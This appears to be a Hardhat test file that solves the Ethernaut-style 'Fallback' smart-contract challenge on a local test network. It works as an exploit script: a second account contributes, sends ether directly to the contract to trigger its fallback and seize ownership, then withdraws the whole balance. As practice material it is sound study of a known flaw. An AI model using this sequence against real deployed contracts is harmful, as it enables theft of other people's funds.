  const { expect } = require("chai");
  
  describe("Fallback", function () {

    let contract;
    let owner;

    this.beforeEach(async () => {
        [owner, user] = await ethers.getSigners();

        const Fallback = await ethers.getContractFactory("Fallback");
        contract = await Fallback.connect(owner).deploy();
    })

    describe("Exploit", function () {
      it("should get ownership and reduce balance to 0", async function () {
        // check if contract owner is the owner signer 
        expect(await contract.owner()).to.eq(owner.address)

        // contribute to set value to the user mapping
        expect(await contract.connect(user).getContribution()).to.eq("0")
        await contract.connect(user).contribute({
          value: ethers.utils.parseEther("0.0001")
        })
        expect(await contract.connect(user).getContribution()).to.eq(ethers.utils.parseEther("0.0001"))

        // call fallback function to get contracts ownership
        await user.sendTransaction({
          to: contract.address,
          value: ethers.utils.parseEther("0.0001")
        })

        expect(await contract.owner()).to.be.eq(user.address)

        // withdraw funds
        expect(
          await ethers.provider.getBalance(contract.address)
        ).to.be.eq(
          ethers.BigNumber.from(ethers.utils.parseEther("0.0002"))
        )

        const balanceBefore = await ethers.provider.getBalance(user.address);
        await contract.connect(user).withdraw();
        
        expect(
          await ethers.provider.getBalance(contract.address)
        ).to.be.eq(0)
      });
    });
  });
  